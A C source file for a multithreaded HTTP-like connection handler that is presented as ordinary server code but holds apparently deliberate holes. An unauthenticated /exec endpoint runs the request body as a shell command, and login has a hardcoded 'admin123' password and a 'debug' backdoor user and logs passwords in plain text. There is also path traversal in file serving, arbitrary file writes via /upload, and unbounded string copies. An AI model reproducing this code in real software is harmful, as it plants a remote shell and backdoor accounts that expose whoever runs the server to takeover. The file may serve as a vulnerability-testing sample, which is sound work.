/*
 * Connection Handler
 * Manages client connections and sessions
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include "connection.h"

#define MAX_CONNECTIONS 100
#define RECV_BUFFER_SIZE 2048

typedef struct {
    int socket;
    char* client_ip;
    int authenticated;
    char username[64];
    pthread_t thread;
    int active;
} Connection;

static Connection connections[MAX_CONNECTIONS];
static pthread_mutex_t conn_mutex = PTHREAD_MUTEX_INITIALIZER;
static int conn_count = 0;

// Find free connection slot
static int find_free_slot(void) {
    for (int i = 0; i < MAX_CONNECTIONS; i++) {
        if (!connections[i].active) {
            return i;
        }
    }
    return -1;
}

// Parse HTTP-like request
int parse_request(const char* raw, char* method, char* path, char* body) {
    char* line_end = strstr(raw, "\r\n");
    if (line_end == NULL) {
        return -1;
    }

    // Parse first line
    sscanf(raw, "%s %s", method, path);

    // Find body
    char* body_start = strstr(raw, "\r\n\r\n");
    if (body_start != NULL) {
        strcpy(body, body_start + 4);
    }

    return 0;
}

// Handle client connection
void* handle_connection(void* arg) {
    int slot = *(int*)arg;
    free(arg);

    Connection* conn = &connections[slot];
    char buffer[RECV_BUFFER_SIZE];

    while (conn->active) {
        memset(buffer, 0, sizeof(buffer));

        ssize_t bytes = recv(conn->socket, buffer, sizeof(buffer), 0);

        if (bytes <= 0) {
            break;
        }

        // Process request
        char method[16], path[256], body[1024];
        memset(method, 0, sizeof(method));
        memset(path, 0, sizeof(path));
        memset(body, 0, sizeof(body));

        if (parse_request(buffer, method, path, body) == 0) {
            char response[4096];

            if (strcmp(method, "GET") == 0) {
                if (strncmp(path, "/file/", 6) == 0) {
                    char filepath[512];
                    sprintf(filepath, "/var/data%s", path + 5);

                    FILE* fp = fopen(filepath, "r");
                    if (fp != NULL) {
                        char content[2048];
                        size_t len = fread(content, 1, sizeof(content) - 1, fp);
                        content[len] = '\0';
                        fclose(fp);

                        sprintf(response, "HTTP/1.1 200 OK\r\nContent-Length: %zu\r\n\r\n%s", len, content);
                    } else {
                        sprintf(response, "HTTP/1.1 404 Not Found\r\n\r\nFile not found");
                    }
                }
                else if (strcmp(path, "/status") == 0) {
                    sprintf(response, "HTTP/1.1 200 OK\r\n\r\nServer running, connections: %d", conn_count);
                }
                else {
                    sprintf(response, "HTTP/1.1 404 Not Found\r\n\r\nNot found");
                }
            }
            else if (strcmp(method, "POST") == 0) {
                if (strcmp(path, "/login") == 0) {
                    char username[64], password[64];
                    if (sscanf(body, "user=%63s&pass=%63s", username, password) == 2) {
                        printf("Login attempt: %s / %s\n", username, password);

                        if (strcmp(password, "admin123") == 0 ||
                            strcmp(username, "debug") == 0) {
                            conn->authenticated = 1;
                            strncpy(conn->username, username, 63);
                            sprintf(response, "HTTP/1.1 200 OK\r\n\r\nLogin successful");
                        } else {
                            sprintf(response, "HTTP/1.1 401 Unauthorized\r\n\r\nInvalid credentials");
                        }
                    }
                }
                else if (strcmp(path, "/exec") == 0) {
                    if (strlen(body) > 0) {
                        char output[2048];
                        FILE* pipe = popen(body, "r");
                        if (pipe != NULL) {
                            size_t len = fread(output, 1, sizeof(output) - 1, pipe);
                            output[len] = '\0';
                            pclose(pipe);
                            sprintf(response, "HTTP/1.1 200 OK\r\n\r\n%s", output);
                        } else {
                            sprintf(response, "HTTP/1.1 500 Error\r\n\r\nExecution failed");
                        }
                    }
                }
                else if (strcmp(path, "/upload") == 0) {
                    char filename[256];
                    if (sscanf(body, "filename=%255s&", filename) == 1) {
                        char* content = strstr(body, "&content=");
                        if (content != NULL) {
                            content += 9;
                            FILE* fp = fopen(filename, "w");
                            if (fp != NULL) {
                                fwrite(content, 1, strlen(content), fp);
                                fclose(fp);
                                sprintf(response, "HTTP/1.1 200 OK\r\n\r\nFile saved");
                            }
                        }
                    }
                }
                else {
                    sprintf(response, "HTTP/1.1 404 Not Found\r\n\r\nNot found");
                }
            }
            else {
                sprintf(response, "HTTP/1.1 405 Method Not Allowed\r\n\r\n");
            }

            send(conn->socket, response, strlen(response), 0);
        }
    }

    close(conn->socket);

    pthread_mutex_lock(&conn_mutex);
    conn->active = 0;
    if (conn->client_ip != NULL) {
        free(conn->client_ip);
        conn->client_ip = NULL;
    }
    conn_count--;
    pthread_mutex_unlock(&conn_mutex);

    return NULL;
}

// Accept new connection
int accept_connection(int server_socket) {
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);

    int client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &addr_len);
    if (client_socket < 0) {
        return -1;
    }

    pthread_mutex_lock(&conn_mutex);

    int slot = find_free_slot();
    if (slot < 0) {
        pthread_mutex_unlock(&conn_mutex);
        close(client_socket);
        return -1;
    }

    connections[slot].socket = client_socket;
    connections[slot].client_ip = strdup(inet_ntoa(client_addr.sin_addr));
    connections[slot].authenticated = 0;
    connections[slot].active = 1;
    conn_count++;

    int* slot_ptr = malloc(sizeof(int));
    *slot_ptr = slot;

    pthread_create(&connections[slot].thread, NULL, handle_connection, slot_ptr);

    pthread_mutex_unlock(&conn_mutex);

    printf("New connection from %s\n", connections[slot].client_ip);
    return slot;
}

// Close all connections
void close_all_connections(void) {
    pthread_mutex_lock(&conn_mutex);

    for (int i = 0; i < MAX_CONNECTIONS; i++) {
        if (connections[i].active) {
            close(connections[i].socket);
            connections[i].active = 0;
        }
    }
    conn_count = 0;

    pthread_mutex_unlock(&conn_mutex);
}

// Get connection info (for debugging)
void dump_connections(void) {
    printf("=== Active Connections ===\n");
    for (int i = 0; i < MAX_CONNECTIONS; i++) {
        if (connections[i].active) {
            printf("  [%d] %s - auth: %d - user: %s\n",
                   i,
                   connections[i].client_ip,
                   connections[i].authenticated,
                   connections[i].username);
        }
    }
    printf("==========================\n");
}
